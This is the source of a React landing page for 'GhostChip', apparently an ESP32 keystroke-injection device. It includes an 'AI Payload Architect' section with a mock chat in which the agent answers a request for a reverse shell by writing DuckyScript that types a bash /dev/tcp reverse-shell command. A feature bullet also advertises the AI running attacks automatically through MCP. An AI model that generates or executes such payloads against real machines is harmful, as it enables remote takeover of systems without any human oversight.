import Nav from "@/components/Nav";
import Hero from "@/components/Hero";
import FeaturesSection from "@/components/FeaturesSection";
import DuckySection from "@/components/DuckySection";
import FeatureIndex from "@/components/FeatureIndex";
import HardwareSection from "@/components/HardwareSection";
import ComparisonSection from "@/components/ComparisonSection";
import PricingSection from "@/components/PricingSection";
import FAQSection from "@/components/FAQSection";
import FinalCTA from "@/components/FinalCTA";
import Footer from "@/components/Footer";
import Cursor from "@/components/Cursor";
import FadeIn from "@/components/FadeIn";
import TypingReveal from "@/components/TypingReveal";
export default function Home() {
  return (
    <>
      <Nav />
      <main style={{ position: "relative", zIndex: 10 }}>
        <Cursor />
        <Hero />
      
      {/* 01. The Problem / Pitch */}
      <section className="section" style={{ position: "relative", background: "transparent", overflow: "hidden" }}>
        <div className="grid-overlay" style={{ opacity: 0.3 }} />
        
        <div style={{ maxWidth: 1200, margin: "0 auto", position: "relative", zIndex: 2, padding: "40px 20px" }}>
        <FadeIn delay={200}>
          <div style={{ textAlign: "center" }}>
            <h2 
              className="font-display" 
              style={{ 
                fontSize: "clamp(60px, 10vw, 150px)",
                color: "var(--gc-white)", 
                marginBottom: 40, 
                lineHeight: 0.85,
                letterSpacing: "-0.02em"
              }}
            >
              HACKING<br/>
              SHOULDN'T BE<br/>
              <span style={{ 
                color: "transparent", 
                WebkitTextStroke: "2px rgba(255,255,255,0.2)",
                position: "relative",
                display: "inline-block"
              }}>
                BORING.
                <div style={{ position: "absolute", top: "50%", left: "-5%", right: "-5%", height: "12px", background: "var(--gc-green)", transform: "rotate(-3deg)", boxShadow: "0 0 30px var(--gc-green)" }} />
              </span>
            </h2>
            <p style={{ fontSize: "clamp(1.1rem, 2vw, 1.3rem)", color: "var(--gc-muted)", lineHeight: 1.6, maxWidth: 700, margin: "0 auto" }}>
              Most security tools require a backpack full of cables, custom drivers, companion apps, or a computer science degree just to run a simple payload. <strong style={{ color: "var(--gc-white)" }}>Not anymore.</strong>
            </p>
          </div>
        </FadeIn>

        {/* Details / Stats Row */}
        <FadeIn delay={400} direction="up">
          <div style={{
            display: "grid",
            gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))",
            gap: 24,
            marginTop: 80
          }}>
            {[
              { title: "ZERO DRIVERS", desc: "Instantly recognized as a standard USB Keyboard on Windows, Mac, and Linux." },
              { title: "ZERO APPS", desc: "100% controlled via your phone's native web browser. Just connect and type." },
              { title: "ZERO CLOUD", desc: "The beautiful Web UI is hosted directly on the ESP32's internal SPIFFS memory." }
            ].map((stat, i) => (
              <div key={i} className="stat-card" style={{
                background: "rgba(255,255,255,0.015)",
                border: "1px solid rgba(255,255,255,0.04)",
                padding: "40px 32px",
                borderRadius: 20,
                textAlign: "center",
                transition: "all 0.4s cubic-bezier(0.16,1,0.3,1)",
              }}>
                <div style={{ fontFamily: "'Bebas Neue', sans-serif", fontSize: "3rem", color: "var(--gc-green)", lineHeight: 1, marginBottom: 16 }}>{stat.title}</div>
                <div style={{ color: "var(--gc-muted)", fontSize: "0.95rem", lineHeight: 1.6 }}>{stat.desc}</div>
              </div>
            ))}
          </div>
        </FadeIn>
        </div>
        <style dangerouslySetInnerHTML={{__html: `
          .stat-card:hover {
            transform: translateY(-8px);
            border-color: rgba(0,255,65,0.3) !important;
            background: rgba(0,255,65,0.02) !important;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
          }
        `}} />
      </section>
      
      <FeaturesSection />
      <DuckySection />
      
      {/* AI Section */}
      <section className="section" style={{ position: "relative", background: "transparent", overflow: "hidden" }}>
        {/* Background pulsing glow */}
        <div style={{
          position: "absolute",
          top: "50%",
          left: "50%",
          transform: "translate(-50%, -50%)",
          width: "60vw",
          height: "60vw",
          background: "radial-gradient(circle, rgba(0,255,65,0.08) 0%, transparent 60%)",
          animation: "pulseGlow 4s ease-in-out infinite alternate",
          pointerEvents: "none",
        }} />
        
        <div style={{ maxWidth: 1280, margin: "0 auto", position: "relative", zIndex: 2 }}>
          <FadeIn delay={100}>
          <div style={{ textAlign: "center", marginBottom: "clamp(40px, 8vw, 80px)" }}>
            <span className="eyebrow">AI PAYLOAD ARCHITECT</span>
            <h2 className="font-display" style={{ fontSize: "clamp(64px, 10vw, 160px)", color: "var(--gc-white)", lineHeight: 0.9, marginTop: 16 }}>
              SPEAK.<br/>
              <span style={{ color: "var(--gc-green)", textShadow: "0 0 40px rgba(0,255,65,0.3)" }}>THEN AUTOMATE.</span>
            </h2>
          </div>
          </FadeIn>

          <div style={{
            display: "grid",
            gridTemplateColumns: "repeat(auto-fit, minmax(clamp(300px, 40vw, 500px), 1fr))",
            gap: "clamp(32px, 5vw, 60px)",
            alignItems: "center"
          }}>
            {/* Left side text */}
            <FadeIn delay={300} direction="right">
            <div>
              <p style={{ fontSize: "1.2rem", color: "var(--gc-muted)", lineHeight: 1.6, marginBottom: 32 }}>
                Powered by OpenRouter and Groq. The built-in <strong>GhostChip Agent</strong> turns natural language into flawless DuckyScript. You no longer need to memorize syntaxes or read manuals.
              </p>
              <ul style={{ listStyle: "none", padding: 0, display: "flex", flexDirection: "column", gap: 20 }}>
                {[
                  "Voice-to-Script: Dictate payloads hands-free.",
                  "Auto-Execution: AI runs the attack directly via MCP.",
                  "Self-Correction: Agent reads errors and debugs code instantly."
                ].map((text, i) => (
                  <li key={i} style={{ display: "flex", alignItems: "center", gap: 16, color: "var(--gc-white)", fontSize: "1rem", letterSpacing: "0.02em" }}>
                    <div style={{ width: 10, height: 10, background: "var(--gc-green)", borderRadius: "50%", boxShadow: "0 0 12px var(--gc-green)", flexShrink: 0 }} />
                    {text}
                  </li>
                ))}
              </ul>
            </div>
            </FadeIn>

            {/* Right side mock UI */}
            <FadeIn delay={500} direction="left">
            <div className="mock-ui-card" style={{
              background: "rgba(255,255,255,0.02)",
              border: "1px solid rgba(255,255,255,0.05)",
              borderRadius: 16,
              padding: "24px",
              boxShadow: "0 30px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1)",
              position: "relative",
              transition: "transform 0.4s",
            }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 24, borderBottom: "1px solid rgba(255,255,255,0.1)", paddingBottom: 16 }}>
                <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#ff5f56" }} />
                <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#ffbd2e" }} />
                <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#27c93f" }} />
                <span style={{ marginLeft: "auto", fontFamily: "'JetBrains Mono', monospace", fontSize: "0.75rem", color: "var(--gc-muted)", textTransform: "uppercase" }}>GhostChip Agent</span>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                <div style={{ alignSelf: "flex-end", background: "rgba(0,255,65,0.1)", border: "1px solid rgba(0,255,65,0.2)", color: "var(--gc-white)", padding: "14px 20px", borderRadius: "16px 16px 0 16px", fontSize: "0.95rem" }}>
                  "Open terminal and reverse shell to my IP."
                </div>
                <div style={{ alignSelf: "flex-start", background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.05)", color: "var(--gc-white)", padding: "16px 20px", borderRadius: "16px 16px 16px 0", fontSize: "0.95rem", maxWidth: "85%" }}>
                  <span style={{ opacity: 0.6, fontSize: "0.85rem", display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ width: 6, height: 6, background: "var(--gc-green)", borderRadius: "50%", animation: "pulseGlow 1s infinite alternate" }} />
                    Generating DuckyScript...
                  </span>
                  <div style={{ marginTop: 12, padding: 12, background: "#050505", borderRadius: 8, fontFamily: "'JetBrains Mono', monospace", fontSize: "0.8rem", color: "var(--gc-green)", lineHeight: 1.5, whiteSpace: "pre-wrap" }}>
                    <TypingReveal text={"GUI SPACE\nDELAY 200\nSTRING Terminal\nENTER\nDELAY 500\nSTRING bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nENTER"} delay={800} speed={40} />
                  </div>
                </div>
              </div>
            </div>
            </FadeIn>
          </div>
        </div>
        <style dangerouslySetInnerHTML={{__html: `
          @keyframes pulseGlow {
            0% { opacity: 0.3; transform: translate(-50%, -50%) scale(0.8); }
            100% { opacity: 0.8; transform: translate(-50%, -50%) scale(1.1); }
          }
          .mock-ui-card {
            transform: perspective(1000px) rotateY(-5deg);
          }
          .mock-ui-card:hover {
            transform: perspective(1000px) rotateY(0deg);
          }
        `}} />
      </section>
      <FeatureIndex />
      <HardwareSection />
      <ComparisonSection />
      <PricingSection />
      <FAQSection />
      <FinalCTA />
      <Footer />
      </main>
    </>
  );
}
